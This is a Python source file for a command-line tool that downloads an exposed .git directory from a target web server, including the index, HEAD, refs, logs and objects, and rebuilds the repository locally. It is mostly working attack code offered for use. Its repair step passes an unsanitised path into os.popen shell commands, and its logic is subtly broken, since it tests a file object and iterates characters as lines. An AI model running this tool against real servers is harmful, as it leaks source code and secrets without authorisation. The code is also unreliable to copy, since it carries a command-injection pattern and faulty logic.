"""
Author: Haozhe Zhang
"""

import binascii
import http.client
import os
import sys
import urllib.parse
import urllib.request
import zlib


class GitCloner:
    def __init__(self, url: str):
        self.base_url = url
        self.workpath = '{}/repo/.git/'.format(urllib.parse.urlparse(url).netloc.replace(':', '_'))
        self.head_hash = str()

    def _request(self, url: str) -> http.client.HTTPResponse:
        """
        Make request with certain headers.
        :param url: str
        :return: http.client.HTTPResponse
        """
        self.request = urllib.request.Request(
            url,
            headers={'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X)'})
        try:
            return urllib.request.urlopen(self.request, timeout=10)
        except Exception as e:
            # print(e)
            # exit(-1)
            print(e, url)
            raise e

    def get_repo_index(self):
        """
        Step 1: download index
        :return:
        """
        print('[+] Downloading index')
        if not os.path.exists(self.workpath):
            os.makedirs(self.workpath)
        url = '{base_url}index'.format(base_url=self.base_url)
        data = self._request(url).read()
        with open('{path}index'.format(path=self.workpath), 'wb') as fp:
            fp.write(data)

    def get_repo_HEAD(self):
        """
        Step 2: download HEAD
        :return:
        """
        print('[+] Downloading HEAD')
        url = '{base_url}HEAD'.format(base_url=self.base_url)
        data = self._request(url).read()
        with open('{path}HEAD'.format(path=self.workpath), 'wb') as fp:
            fp.write(data)

    def get_repo_branch(self):
        """
        Step 3L download ref branch
        :return:
        """
        # Load HEAD and find ref.
        with open('{path}HEAD'.format(path=self.workpath), 'rb') as fp:
            ref = fp.read().strip().decode().split(': ')[1]

        print('[+] Downloading {}'.format(ref))

        # Requests for head hash and save
        head_url = '{base_url}{ref}'.format(base_url=self.base_url, ref=ref)
        data = self._request(head_url).read().strip()

        # Save the hash inside the ref file into the target place.
        ref_path = '/'.join(ref.split('/')[:-1])
        if not os.path.exists('{path}{ref_path}'.format(path=self.workpath, ref_path=ref_path)):
            os.makedirs('{path}{ref_path}'.format(path=self.workpath, ref_path=ref_path))
        with open('{path}{ref}'.format(path=self.workpath, ref=ref), 'wb') as fp:
            fp.write(data)

        # After get ref->head_hash, why not share it.
        self.head_hash = data.decode()

    def get_repo_objects(self):
        """
        Step 4: download all objects
        :return:
        """
        commit_hash = self.head_hash
        self._get_object(commit_hash)

    def get_repo_logs(self):
        """
        step 5: download logs
            /logs/refs/heads/master
            /logs/refs/remotes/origin/master
        :return:
        """
        try:
            url = '{base_url}logs/refs/heads/master'.format(base_url=self.base_url)
            path = '{workpath}logs/refs/heads/'.format(workpath=self.workpath)
            if not os.path.exists(path):
                os.makedirs(path)

            data = self._request(url).read()
            with open('{path}master'.format(path=path), 'wb') as fp:
                fp.write(data)
        except: # I don't expect it.
            pass

        try:
            url = '{base_url}logs/refs/remotes/origin/HEAD'.format(base_url=self.base_url)
            path = '{workpath}logs/refs/remotes/origin/'.format(workpath=self.workpath)
            if not os.path.exists(path):
                os.makedirs(path)

            data = self._request(url).read()
            with open('{path}HEAD'.format(path=path), 'wb') as fp:
                fp.write(data)
        except: # I don't expect it neither.
            pass

    def _get_object(self, hash_str):
        # download
        data = self._download_file(hash_str)

        # parse
        data = zlib.decompress(data)
        # commit
        if data[:6] == b'commit':
            # read commit - tree
            if data.find(b'tree') != -1:
                tree_hash_idx = data.find(b'tree') + 5
                tree_hash_str = data[tree_hash_idx: tree_hash_idx + 40].decode().strip()
                self._get_object(tree_hash_str)

            # read commit - parent (another commit. recursion here.)
            if data.find(b'parent') != -1:
                parent_hash_idx = data.find(b'parent') + 7
                parent_hash_str = data[parent_hash_idx: parent_hash_idx + 40].decode().strip()
                self._get_object(parent_hash_str)
        # tree
        if data[:4] == b'tree':
            split_tree = data.split('100644 '.encode())
            for i in range(1, len(split_tree)):
                pivot_idx = split_tree[i].find(b'\x00')
                file_hash = split_tree[i][pivot_idx + 1:]
                file_hash = binascii.b2a_hex(file_hash).decode()
                self._get_object(file_hash)

        # blob
        if data[:4] == b'blob':
            # No need to parse it again.
            pass

    def _download_file(self, hash_str):
        print('[+] Downloading objects/{}/{}'.format(hash_str[:2], hash_str[2:]))

        # request
        url = '{base_url}objects/{di}/{fi}'.format(base_url=self.base_url, di=hash_str[:2], fi=hash_str[2:])
        data = self._request(url).read()

        # save
        if not os.path.exists('{path}objects/{di}/'.format(path=self.workpath, di=hash_str[:2])):
            os.makedirs('{path}objects/{di}/'.format(path=self.workpath, di=hash_str[:2]))
        with open('{path}objects/{di}/{fi}'.format(path=self.workpath, di=hash_str[:2], fi=hash_str[2:]),
                  'wb') as fp:
            fp.write(data)
        return data

    def try_to_make_it_better(self):
        try:
            # check if git is installed
            import os
            repo_path = '/'.join(self.workpath.split('/')[:-2])
            if 'command not found' not in os.popen('git'):
                # git is installed
                # fix
                for line in os.popen('cd {path}; git fsck'.format(path=repo_path)).read():
                    if line.startswith('missing'):
                        self._download_file(line.split(' ')[2])

                # reset to the newest commit
                os.popen('cd {path}; git reset --hard'.format(path=repo_path))
        except:
            pass

    def run(self):
        self.get_repo_index()
        self.get_repo_HEAD()
        self.get_repo_branch()
        self.get_repo_objects()
        self.get_repo_logs()

        self.try_to_make_it_better()
        print('[*] Finished. Check your repo at {}'.format(self.workpath))


def test():
    url = 'http://192.168.64.2/GitHacker/.git/'

    cloner = GitCloner(url)
    cloner.run()


def main():
    if len(sys.argv) == 1:
        print('[Usage] python3 gitclone.py http://target.com/.git/')
        exit(0)

    url = sys.argv[1]
    cloner = GitCloner(url)
    cloner.run()


if __name__ == '__main__':
    main()
